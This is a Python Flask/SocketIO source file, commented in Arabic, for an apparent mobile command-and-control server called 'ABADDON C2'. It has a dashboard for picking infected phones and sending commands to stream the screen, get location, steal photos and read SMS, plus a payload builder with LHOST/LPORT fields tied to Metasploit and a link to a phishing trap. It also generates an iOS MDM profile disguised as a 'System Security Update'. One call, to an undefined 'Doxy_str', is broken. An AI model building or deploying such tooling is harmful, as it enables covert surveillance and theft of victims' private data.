import os
import socket
import threading
from flask import Flask, render_template_string, request, jsonify, redirect
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'abaddon_demon_secret'
# ضروري جداً لـ Render
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# =====================================================================
# 1. واجهة أبادون الشيطانية (Abaddon Dashboard)
# =====================================================================
HTML_DASHBOARD = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ABADDON C2 - الهاوية</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        :root { --bg: #020000; --panel: #0d0000; --red: #ff0000; --dark-red: #550000; --text: #ffcccc; --green: #00ff00; --cyan: #00ffff; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Share Tech Mono', monospace; }
        body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; background-image: radial-gradient(circle at 50% 50%, #1a0000 0%, #000 100%); overflow-x: hidden; }
        
        header { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; background: var(--panel); border-bottom: 2px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.4); flex-wrap: wrap; gap: 10px; z-index: 10;}
        .logo h1 { color: var(--red); font-size: 22px; text-shadow: 0 0 15px var(--red); letter-spacing: 3px; animation: glitch 1s infinite alternate; }
        @keyframes glitch { 0% { text-shadow: 2px 0 var(--cyan), -2px 0 var(--red); } 100% { text-shadow: -2px 0 var(--cyan), 2px 0 var(--red); } }
        #status { font-size: 14px; color: var(--green); text-shadow: 0 0 10px var(--green); }
        
        main { display: flex; flex: 1; flex-direction: column; gap: 15px; padding: 15px; }
        
        .sidebar { width: 100%; background: var(--panel); border: 1px solid var(--dark-red); padding: 15px; border-radius: 5px; display: flex; flex-direction: column; gap: 10px; }
        .section-title { color: var(--red); font-size: 16px; border-bottom: 1px dashed var(--dark-red); padding-bottom: 5px; text-shadow: 0 0 5px var(--red); margin-top: 10px; }
        
        .btn { padding: 12px; background: #1a0000; color: var(--red); border: 1px solid var(--red); cursor: pointer; font-weight: bold; font-family: inherit; font-size: 14px; transition: all 0.3s; text-align: center; text-transform: uppercase; border-radius: 3px; }
        .btn:hover { background: var(--red); color: #000; box-shadow: 0 0 15px var(--red); }
        
        #device-list { list-style: none; max-height: 200px; overflow-y: auto; }
        .device-item { padding: 12px; margin-bottom: 8px; background: #0a0000; border: 1px solid var(--dark-red); cursor: pointer; display: flex; justify-content: space-between; align-items: center; font-size: 14px; border-radius: 3px; transition: 0.3s;}
        .device-item:hover { border-color: var(--red); background: #1a0000; }
        .device-item.selected { border-color: var(--red); box-shadow: inset 0 0 10px rgba(255,0,0,0.5); background: #2a0000;}
        
        .workspace { width: 100%; display: flex; flex-direction: column; gap: 15px; }
        .screen-mirror { width: 100%; height: 350px; background: #000; border: 2px solid var(--red); display: flex; justify-content: center; align-items: center; border-radius: 5px; overflow: hidden; position: relative; box-shadow: 0 0 25px rgba(255,0,0,0.2); }
        #screen-stream { max-height: 100%; max-width: 100%; object-fit: contain; display: none; }
        .placeholder { color: var(--red); font-size: 18px; text-shadow: 0 0 10px var(--red); animation: pulse 2s infinite; text-align: center; padding: 0 10px;}
        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
        
        .terminal { height: 150px; background: #000; border: 1px solid var(--dark-red); padding: 10px; font-size: 13px; color: var(--green); overflow-y: auto; font-family: 'Courier New', monospace; border-radius: 5px; box-shadow: inset 0 0 10px rgba(0,255,0,0.1); }
        .control-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        
        @media (min-width: 768px) {
            main { flex-direction: row; padding: 20px; }
            .sidebar { width: 350px; height: calc(100vh - 100px); overflow-y: auto; }
            .workspace { flex: 1; height: calc(100vh - 100px); }
            .screen-mirror { flex: 1; height: auto; }
            .control-grid { grid-template-columns: repeat(3, 1fr); }
            .logo h1 { font-size: 28px; }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo"><h1>👹 ABADDON C2</h1></div>
        <div id="status">جاري الاتصال بالهاوية...</div>
    </header>
    <main>
        <aside class="sidebar">
            <div class="section-title">👁️ الأجهزة المتصلة (<span id="device-count">0</span>)</div>
            <ul id="device-list"></ul>
            
            <div class="section-title" style="margin-top:15px;">🕸️ أدوات الحقن</div>
            <button class="btn" onclick="window.open('/build_payload', '_blank')" style="margin-bottom:5px;">توليد حمولة (Payload)</button>
            <button class="btn" onclick="window.open('/phish', '_blank')">فخ التصيد (Phishing)</button>
        </aside>
        
        <section class="workspace">
            <div class="screen-mirror">
                <div id="mirror-placeholder" class="placeholder">[ بانتظار فتح عين الهاوية ]</div>
                <img id="screen-stream" src="" />
            </div>
            <div class="terminal" id="log-output">
                > ABADDON Core Initialized.<br>
                > Routing through hidden nodes...<br>
                > Waiting for targets...
            </div>
            <div class="control-grid">
                <button class="btn" data-command="start_mirror" style="color:var(--cyan); border-color:var(--cyan);">🖥️ بث الشاشة</button>
                <button class="btn" data-command="get_location">📍 الموقع</button>
                <button class="btn" data-command="steal_photos">📸 سحب الصور</button>
                <button class="btn" data-command="get_sms">💬 الرسائل</button>
                <button class="btn" data-command="change_wallpaper">🖼️ تغيير الخلفية</button>
                <button class="btn" data-command="vibrate">📳 اهتزاز</button>
            </div>
        </section>
    </main>

    <script>
        const socket = io();
        let selectedId = null;

        socket.on('connect', () => {
            document.getElementById('status').innerText = "متصل بالهاوية";
            log("> Connection established with ABADDON.");
        });
        
        socket.on('update_screen', (data) => {
            const img = document.getElementById('screen-stream');
            img.style.display = 'block';
            document.getElementById('mirror-placeholder').style.display = 'none';
            img.src = 'data:image/jpeg;base64,' + data.frame;
        });

        socket.on('new_device', (data) => {
            log(`> [NEW TARGET] IP: ${data.ip} | Model: ${data.model}`);
            // تحديث القائمة (الخادم سيرسل القائمة كاملة)
        });

        socket.on('client_response', (data) => {
            log(`> [DATA] ${data.command}: ${JSON.stringify(data.result)}`);
        });

        function log(msg) {
            const term = document.getElementById('log-output');
            term.innerHTML += `<br>${msg}`;
            term.scrollTop = term.scrollHeight;
        }

        function renderDevices(devices) {
            const list = document.getElementById('device-list');
            list.innerHTML = '';
            document.getElementById('device-count').innerText = devices.length;
            devices.forEach(d => {
                const li = document.createElement('li');
                li.className = 'device-item';
                li.innerHTML = `<div><span style="color:var(--red); font-weight:bold;">${d.model || 'Unknown Device'}</span><br><span style="font-size:11px; color:#888;">${d.id}</span></div>`;
                li.onclick = () => {
                    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('selected'));
                    li.classList.add('selected');
                    selectedId = d.id;
                    log(`> Target selected: ${d.id}`);
                };
                list.appendChild(li);
            });
        }

        // تحديث القائمة كل 5 ثواني (Polling احتياطي)
        setInterval(async () => {
            const res = await fetch('/api/devices');
            const data = await res.json();
            renderDevices(data.devices);
        }, 5000);

        document.querySelectorAll('.btn[data-command]').forEach(btn => {
            btn.onclick = () => {
                if (!selectedId) return log("[-] خطأ: اختر جهازاً أولاً من القائمة.");
                let payload = {};
                if (btn.dataset.command === 'change_wallpaper') payload.url = prompt("رابط الصورة:");
                socket.emit('command', { targetId: selectedId, command: btn.dataset.command, payload });
                log(`[+] إرسال أمر [ ${btn.dataset.command} ] إلى ${selectedId}`);
            };
        });
    </script>
</body>
</html>
"""

# =====================================================================
# 2. صفحات الحقن (Payload Builder & Phishing)
# =====================================================================
HTML_BUILDER = """
<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>ABADDON Builder</title>
<style>body{background:#000;color:#f00;font-family:monospace;text-align:center;padding:50px;}input,select{background:#111;color:#0f0;border:1px solid #f00;padding:10px;margin:10px;width:80%;max-width:300px;}button{background:#f00;color:#000;padding:15px 30px;border:none;font-weight:bold;cursor:pointer;}</style></head>
<body><h1>👹 ABADDON Payload Builder</h1><br>
<form action="/download_payload" method="GET">
    <input type="text" name="lhost" value="YOUR_SERVER_IP" placeholder="LHOST (IP or URL)"><br>
    <input type="text" name="lport" value="4444" placeholder="LPORT"><br>
    <select name="os"><option value="android">Android (APK)</option><option value="ios">iOS (MDM)</option></select><br>
    <button type="submit">توليد الحمولة الخبيثة</button>
</form>
<p style="margin-top:20px; color:#888;">ملاحظة: لتوليد APK حقيقي، يجب أن يعمل هذا السيرفر على VPS مع Metasploit.</p>
</body></html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_DASHBOARD)

@app.route('/build_payload')
def build_payload():
    return render_template_string(HTML_BUILDER)

@app.route('/download_payload')
def download_payload():
    lhost = request.args.get('lhost')
    lport = request.args.get('lport')
    os_type = request.args.get('os')
    if os_type == 'android':
        # في الواقع، هنا يتم استدعاء msfvenom
        return f"<h1 style='color:red;text-align:center;'>جاري بناء APK ب{Doxy_str(lhost)}:{lport}...</h1><p style='text-align:center;color:white;'>في بيئة Render، لا يمكن تشغيل Metasploit. استخدم VPS حقيقي (Kali) لتوليد APK.</p>", 200
    else:
        # iOS MDM
        mdm = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array><dict><key>PayloadType</key><string>com.apple.mdm</string><key>PayloadVersion</key><integer>1</integer><key>PayloadIdentifier</key><string>com.abaddon.mdm</string><key>PayloadUUID</key><string>12345678-1234-1234-1234-123456789012</string><key>ServerURL</key><string>https://YOUR_SERVER/mdm</string></dict></array><key>PayloadDisplayName</key><string>System Security Update</string><key>PayloadIdentifier</key><string>com.abaddon.profile</string><key>PayloadUUID</key><string>12345678-1234-1234-1234-123456789011</string><key>PayloadVersion</key><integer>1</integer></dict></plist>"""
        return mdm, 200, {'Content-Type': 'application/x-apple-aspen-config'}

# =====================================================================
# 3. إدارة الأجهزة و C2 (SocketIO)
# =====================================================================
connected_clients = {} # { "client_id": {"info": {}, "sid": "..."} }

@app.route('/api/devices')
def get_devices():
    devices = [{"id": cid, "model": c["info"].get("model", "Unknown")} for cid, c in connected_clients.items()]
    return jsonify({"devices": devices})

@socketio.on('device_info')
def handle_device_info(data):
    client_id = request.sid
    connected_clients[client_id] = {"info": data, "sid": client_id}
    print(f"[+] Device Connected: {client_id} | {data.get('model')}")
    emit('new_device', {"id": client_id, "ip": data.get('ip'), "model": data.get('model')}, broadcast=True)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    # بث الشاشة لجميع لوحات التحكم
    emit('update_screen', data, broadcast=True, skip_sid=request.sid)

@socketio.on('command')
def handle_command(data):
    target_id = data.get('targetId')
    if target_id in connected_clients:
        print(f"[*] Routing {data['command']} to {target_id}")
        socketio.emit('execute_command', data, room=target_id)

@socketio.on('client_response')
def handle_client_response(data):
    client_id = request.sid
    emit('client_response', {"command": data.get('command'), "result": data.get('result')}, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_clients:
        print(f"[-] Device Disconnected: {request.sid}")
        del connected_clients[request.sid]

# =====================================================================
# 4. التشغيل
# =====================================================================
if __name__ == '__main__':
    # Render يعطي بورت في متغير البيئة PORT
    port = int(os.environ.get('PORT', 5000))
    print("""
    █████╗ ██████╗  █████╗ ██████╗ ██████╗  ██████╗ ███╗   ██╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔═══██╗████╗  ██║
    ███████║██████╔╝███████║██║  ██║██║  ██║██║   ██║██╔██╗ ██║
    ██╔══██║██╔══██╗██╔══██║██║  ██║██║  ██║██║   ██║██║╚██╗██║
    ██║  ██║██████╔╝██║  ██║██████╔╝██████╔╝╚██████╔╝██║ ╚████║
    ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
    [*] ABADDON C2 Server Initialized.
    [*] Render Port: """ + str(port))
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
